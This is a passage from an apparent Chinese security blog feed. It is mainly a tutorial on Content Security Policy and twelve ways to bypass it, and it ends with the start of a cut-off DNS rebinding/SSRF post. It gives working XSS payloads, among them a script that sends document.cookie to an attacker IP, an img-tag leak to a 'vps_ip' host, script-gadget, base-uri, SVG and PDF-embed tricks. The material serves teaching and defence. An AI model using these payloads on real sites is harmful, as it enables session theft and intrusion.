<p><a class="link"   href="https://www.youtube.com/watch?v=38e-sxPWiuY&t=1551s" >https://www.youtube.com/watch?v=38e-sxPWiuY&amp;t=1551s<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>CSP策略及绕过方法</title>
    <url>/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>XSS是最常见、危害最大的网页安全漏洞，想要抵御它们，要采取非常多编程措施，非常麻烦。那么，有没有可以从根本上解决问题，浏览器自动禁止外部注入恶意脚本的方法呢？CSP应运而生。</p>
<h2 id="什么是CSP"><a href="#什么是CSP" class="headerlink" title="什么是CSP"></a>什么是CSP</h2><p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，它实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，哪些不可以。</p>
<h2 id="CSP策略组成"><a href="#CSP策略组成" class="headerlink" title="CSP策略组成"></a>CSP策略组成</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;指令范围&gt; &lt;内容源&gt; </span><br></pre></td></tr></table></figure>

<h3 id="指令范围"><a href="#指令范围" class="headerlink" title="指令范围"></a>指令范围</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">script-src：外部脚本</span><br><span class="line">style-src：样式表</span><br><span class="line">img-src：图像</span><br><span class="line">media-src：媒体文件（音频和视频）</span><br><span class="line">font-src：字体文件</span><br><span class="line">object-src：插件（比如 Flash）</span><br><span class="line">child-src：框架</span><br><span class="line">frame-ancestors：嵌入的外部资源（比如&lt;frame&gt;、&lt;iframe&gt;、&lt;embed&gt;和&lt;applet&gt;）</span><br><span class="line">connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</span><br><span class="line">worker-src：worker脚本</span><br><span class="line">manifest-src：manifest 文件</span><br><span class="line">dedault-src：默认配置</span><br><span class="line">frame-ancestors：限制嵌入框架的网页</span><br><span class="line">base-uri：限制&lt;base#href&gt;</span><br><span class="line">form-action：限制&lt;form#action&gt;</span><br><span class="line">block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</span><br><span class="line">upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</span><br><span class="line">plugin-types：限制可以使用的插件格式</span><br><span class="line">sandbox：浏览器行为的限制，比如不能有弹出窗口等。</span><br></pre></td></tr></table></figure>

<h3 id="内容源"><a href="#内容源" class="headerlink" title="内容源"></a>内容源</h3><p>内容源主要由[源列表] [关键字] [数据]组成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关键字(需要用单引号包裹)</span><br><span class="line">	&#x27;none&#x27;</span><br><span class="line">		代表空集；即不匹配任何 URL</span><br><span class="line">	&#x27;self&#x27;</span><br><span class="line">		代表和文档同源，包括相同的 URL 协议和端口号</span><br><span class="line">	&#x27;unsafe-inline&#x27;</span><br><span class="line">		允许使用内联资源，如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素</span><br><span class="line">	&#x27;unsafe-eval&#x27;</span><br><span class="line">		允许使用 eval() 等通过字符串创建代码的方法</span><br><span class="line">	*</span><br><span class="line">		星号表示允许任何URL资源，没有限制</span><br><span class="line">源列表</span><br><span class="line">	http://*.foo.com （匹配所有使用 http协议加载 foo.com 任何子域名的尝试。）</span><br><span class="line">	mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）</span><br><span class="line">	https://store.foo.com （匹配所有使用 https协议访问 store.foo.com 的尝试。）</span><br><span class="line">	......    </span><br><span class="line">数据</span><br><span class="line">	data:</span><br><span class="line">		仅允许数据模式（如Base64编码的图片）方式加载资源</span><br><span class="line">	mediastream:</span><br><span class="line">		允许mediastream: URI作为内容来源</span><br></pre></td></tr></table></figure>

<h3 id="实现demo"><a href="#实现demo" class="headerlink" title="实现demo"></a>实现demo</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">通过响应头实现：</span><br><span class="line">Content-Security-policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;;<span class="comment">&lt;!--关键字作为内容源--&gt;</span></span><br><span class="line">Content-Security-policy: default-src &#x27;self&#x27;; script-src allowed.com;<span class="comment">&lt;!--源列表作为内容源--&gt;</span></span><br><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; img-src &#x27;self&#x27; data:; media-src mediastream: <span class="comment">&lt;!--数据作为内容源--&gt;</span></span><br><span class="line">通过html元标签实现：</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://*; child-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>本文未说明代码的例子由下面demo代码改造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;session&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;session&#x27;</span>,<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">1000</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: script-src &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your POST content&quot;</span>.@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x01-重定向绕过"><a href="#0x01-重定向绕过" class="headerlink" title="0x01 重定向绕过"></a>0x01 重定向绕过</h3><p><strong>条件</strong></p>
<p>1.可以执行任意js脚本，但由于CSP无法数据外带</p>
<p>2.CSP为<code>script-src &#39;unsafe-inline&#39;</code></p>
<p><strong>绕过方法</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">a=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;http://10.146.110.37:7777?&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--也可用window.location/window.open()跳转方法外带数据--&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160730764.png" class="" title="image-20210614160730764">

<h3 id="0x02-meta网页跳转绕过"><a href="#0x02-meta网页跳转绕过" class="headerlink" title="0x02 meta网页跳转绕过"></a>0x02 meta网页跳转绕过</h3><p><strong>绕过条件</strong></p>
<p>无</p>
<p><strong>绕过方法（只能跳转，无法携带数据）</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">a=<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1;url=http://10.146.110.37:7777&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>效果图</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160921062.png" class="" title="image-20210614160921062">

<h3 id="0x03-iframe标签绕过"><a href="#0x03-iframe标签绕过" class="headerlink" title="0x03 iframe标签绕过"></a>0x03 iframe标签绕过</h3><p><strong>条件</strong></p>
<p>1.一个同源站点存在两个页面，其中一个有CSP保护，一个没有且存在xss漏洞</p>
<p>2.我们要的数据在存在CSP保护的页面中</p>
<p><strong>绕过方法</strong></p>
<p>B页面利用iframe加载A页面，绕过A页面CSP策略。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--A.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--B.html--&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);iframe.<span class="property">src</span>=<span class="string">&quot;http://localhost/CSP/demo3/A.html&quot;</span>;<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);<span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="title function_">alert</span>(iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerHTML</span>),<span class="number">1000</span>);<span class="comment">//setTimeout是为了等待iframe加载完成</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614161923694.png" class="" title="image-20210614161923694">

<p><strong>其他利用方法</strong></p>
<p>在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http:&#x2F;&#x2F;xxx”页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库：<code>&lt; iframe csp=&quot;script-src &#39;unsafe-inline&#39;&quot; src=&quot;http://xxx&quot;&gt;&lt;/iframe&gt;</code></p>
<h3 id="0x04-CDN绕过"><a href="#0x04-CDN绕过" class="headerlink" title="0x04 CDN绕过"></a>0x04 CDN绕过</h3><p>一般来说，前端要用到许多的前端框架和库，而部分企业为了效率或者其他原因，会选择使用其他CDN上的js框架，当这些CDN上存在一些低版本的框架时，就可能存在绕过CSP的风险</p>
<p><strong>利用条件</strong></p>
<p>1.该CDN服务商在CSP白名单中</p>
<p>2.CDN服务商存在低版本的js库</p>
<p><strong>demo</strong></p>
<p>csp设置</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">content-security-policy: script-src &#x27;self&#x27; vimeo.com &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com </span><br></pre></td></tr></table></figure>

<p>绕过方法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span> </span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162055744.png" class="" title="image-20210614162055744">

<p>这里的绕过方法详细说明可以参考链接</p>
<p><a class="link"   href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" >https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/google/security-research-pocs/tree/master/script-gadgets" >https://github.com/google/security-research-pocs/tree/master/script-gadgets<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="0x05-不完整script标签绕过"><a href="#0x05-不完整script标签绕过" class="headerlink" title="0x05 不完整script标签绕过"></a>0x05 不完整script标签绕过</h3><p><strong>条件</strong></p>
<p>1.可控点在合法script标签上方,且其中没有其他标签</p>
<p>2.XSS页面的CSP <code>script-src</code>只采用了<code>nonce</code>方式</p>
<p><strong>demo</strong></p>
<p>csp设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-xxxxx&#x27;&quot;&gt;&lt;?php echo $_GET[&#x27;a&#x27;]?&gt;</span><br><span class="line">&lt;script nonce=&#x27;xxxxx&#x27;&gt;  //do some thing&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>利用方法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?a=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/plain,alert(1)</span></span></span><br></pre></td></tr></table></figure>

<p>我们可以发现&lt;script就会被变成一个属性，值为空，之后的<code>nonce=&#39;xxxxx&#39;</code>会被当成我们输入的script标签中的一个属性，成功绕过<code>script-src</code>，<code>&lt;/script</code>就会被变成一个属性，值为空</p>
<p>火狐浏览器</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162119762.png" class="" title="image-20210614162119762">

<p>上述绕过方法在chrome浏览器不生效，因为在chrome中，虽然第二个&lt;script 被当成了属性名，但依旧会干扰chrome对标签的解析，造成错误，使我们的exp无法成功执行。这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略。</p>
<p>例如<code>&lt;h1 a=&quot;123&quot; b=&quot;456&quot; a=&quot;789&quot; a=&quot;abc&quot;&gt;123&lt;/h1&gt;</code>，这里a属性的值为123，所以就可以通过如下pyaload绕过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?a=123<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:text/plain,alert(1)&quot;</span> <span class="attr">a</span>=<span class="string">123</span> <span class="attr">a</span>= </span></span><br></pre></td></tr></table></figure>


<p>先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个&lt;script赋给了第二个a属性</p>
<p>chrome浏览器</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162131003.png" class="" title="image-20210614162131003">

<p>这里查看页面标签已经嵌入成功，但src却执行不了就很奇怪</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162138551.png" class="" title="image-20210614162138551">

<h3 id="0x06-不完整的资源标签获取资源"><a href="#0x06-不完整的资源标签获取资源" class="headerlink" title="0x06 不完整的资源标签获取资源"></a>0x06 不完整的资源标签获取资源</h3><p><strong>条件</strong></p>
<p>1.可以加载外域资源 (<code>img-src: *</code>)</p>
<p>2.需要获取页面某处的信息</p>
<p><strong>demo</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;;script-src &#x27;self&#x27;; img-src *;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&#x27;xss&#x27;]?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class="line">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure>

<p>利用方法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/csp.php?xss=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;//vps_ip?a=</span></span></span><br></pre></td></tr></table></figure>

<p>注意这里src只有左边的引号</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162156829.png" class="" title="image-20210614162156829">

<p>chorme下该payload并不会成功，因为chrome不允许发出的url中含有回车或&lt;</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162208999.png" class="" title="image-20210614162208999">

<h3 id="0x07-站点可控静态资源绕过"><a href="#0x07-站点可控静态资源绕过" class="headerlink" title="0x07 站点可控静态资源绕过"></a>0x07 站点可控静态资源绕过</h3><p><strong>条件</strong></p>
<p>1.可控的静态资源站点在白名单内</p>
<p><strong>demo</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用方法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>案例中CSP设置了<code>unsafe-eval</code>白名单为<code>www.google-analytics.com</code> ，而<code>www.google.analytics.com</code>中提供了自定义javascript的功能（google会封装自定义的js，所以还需要<code>unsafe-eval</code>），于是可以绕过CSP</p>
<h3 id="0x08-302跳转绕过"><a href="#0x08-302跳转绕过" class="headerlink" title="0x08 302跳转绕过"></a>0x08 302跳转绕过</h3><p><strong>条件</strong></p>
<p>1.在script-src允许的域下有需要获取的信息</p>
<p>2.在script-src允许的域下存在任意重定向</p>
<p><strong>demo</strong></p>
<p>a目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- csp.php --&gt;</span><br><span class="line">&lt;?php header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src http://127.0.0.1/a/&quot;);?&gt; </span><br><span class="line">&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt;     csp header test  &lt;/body&gt; &lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- redirect.php --&gt;</span><br><span class="line">&lt;?php header(&quot;Location: &quot; . $_GET[url]);?&gt;</span><br></pre></td></tr></table></figure>

<p>b目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- test.php --&gt;</span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;	</span><br></pre></td></tr></table></figure>

<p><strong>利用方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/a/redirect.php?url=/b/test.php</span><br></pre></td></tr></table></figure>

<p>csp限制了<code>/a/</code>目录，而我们的目标脚本在<code>/b/</code>目录下则如果这时候请求redirect页面去访问<code>/b/</code>下的脚本是可以通过csp的检查的</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162229814.png" class="" title="image-20210614162229814">

<h3 id="0x09-Base-uri绕过"><a href="#0x09-Base-uri绕过" class="headerlink" title="0x09 Base-uri绕过"></a>0x09 Base-uri绕过</h3><p><strong>条件</strong></p>
<ol>
<li><code>script-src</code>只使用<code>nonce</code></li>
<li>没有额外设置base-uri</li>
<li>页面引用存在相对路径的<code>&lt;script&gt;</code>标签</li>
</ol>
<p><strong>demo</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;//10.146.110.37/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&#x27;test&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162248786.png" class="" title="image-20210614162248786">

<p>如果未设置nonce将无法绕过</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162255139.png" class="" title="image-20210614162255139">

<h3 id="0x10-SVG绕过"><a href="#0x10-SVG绕过" class="headerlink" title="0x10 SVG绕过"></a>0x10 SVG绕过</h3><p><strong>条件</strong></p>
<p>1.可以上传svg图片</p>
<p><strong>利用方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x11-CRLF绕过"><a href="#0x11-CRLF绕过" class="headerlink" title="0x11 CRLF绕过"></a>0x11 CRLF绕过</h3><p>当页面存在CRLF漏洞时，且返回的CSP头在我们可控点的下方，则可通过回车换行注入CSP返回头绕过。该绕过方法较简单，这里就举例了</p>
<h3 id="0x12-object-src绕过（PDFXSS）"><a href="#0x12-object-src绕过（PDFXSS）" class="headerlink" title="0x12 object-src绕过（PDFXSS）"></a>0x12 object-src绕过（PDFXSS）</h3><p>在CSP标准里面，有一个属性是<code>object-src</code>，它限制的是<code>&lt;embed&gt;</code> <code>&lt;object&gt;</code> <code>&lt;applet&gt;</code>标签的src，也就是插件的src<br>于是我们可以通过插件来执行Javascript代码，插件的js代码并不受<code>script-src</code>的约束</p>
<p><strong>利用条件</strong></p>
<ol>
<li>没有设置<code>object-src</code>，或者<code>object-src</code>没有设置为<code>&#39;none&#39;</code></li>
<li>pdf用的是chrome的默认解析器</li>
</ol>
<p><strong>demo</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27;&quot;&gt;&lt;?php echo $_GET[&#x27;xss&#x27;]?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>构造pdf的XSS放在vps上</p>
<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162329478.png" class="" title="image-20210614162329478">

<p>然后在XSS处写入embed标签且src为pdf连接</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//vps_ip/123.pdf&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162334912.png" class="" title="image-20210614162334912">

<p>但是PDF的XSS并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等</p>
<p>具体能执行哪些恶意js可以参考这篇<a class="link"   href="https://blog.csdn.net/microzone/article/details/52850623" >文章<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://mp.weixin.qq.com/s/RgIQi5rQA7EO3iDFEQbVCA" >CSP浅析与绕过<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/5084" >我的CSP绕过思路及总结<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.jianshu.com/p/f1de775bc43e" >CSP策略及绕过方法<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://cloud.tencent.com/developer/chapter/13541" >CSP开发者手册–腾讯云<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://paper.seebug.org/423" >前端防御从入门到弃坑–CSP变迁<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>DNS重绑定与SSRF绕过</title>
    <url>/2022/01/12/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E4%B8%8ESSRF%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="0x01-DNS重绑定-DNS-Rebinding"><a href="#0x01-DNS重绑定-DNS-Rebinding" class="headerlink" title="0x01 DNS重绑定(DNS Rebinding)"></a>0x01 DNS重绑定(DNS Rebinding)</h2><p>通常我们通过域名访问应用的流程是：浏览器向DNS服务器发送请求，DNS服务器将请求的域名转换为ip地址，然后向对应的IP地址请求资源，最后回显给用户。</p>
<p>在访问DNS后请求方会缓存域名和IP的对应关系，而缓存时间就是由DNS服务器设置的TTL值决定。</p>
<p>当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改通过某种方式对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址，对于浏览器来说前后2次访问是同一域名，所以认为是安全的，这就可导致绕过同源策略和SSRF限制。下面介绍3种常见的DNS从绑定方法。</p>
<h3 id="1-1-TTL-x3D-0的A记录"><a href="#1-1-TTL-x3D-0的A记录" class="headerlink" title="1.1 TTL&#x3D;0的A记录"></a>1.1 TTL&#x3D;0的A记录</h3><p>国内的域名厂商基本都不可以设置TTL为0，某些国外的域名才可以设置TTL&#x3D;0，这方法只适用于前后两次请求存在一定有时间间隔或时间可控的情况。</p>
<p>举个CTF例子，你能向服务器提交一个URL,并且服务器会访问你提交的url。然后flag藏在服务器的本身的<code>http://127.0.0.1/secret</code>上。只能本地访问。</p>
<p>但是这里你提交你能控制的页面<code>www.x.com/index.php</code>，但是由于同源策略的原因你没办法去获取服务器上的<code>http://127.0.0.1/secret</code>。 但是通过<code>dns rebinding</code>就可以了。 比如你的页面如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://*********/static/jquery.min.js</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;POST()&quot;</span>,<span class="number">90000</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">POST</span>(<span 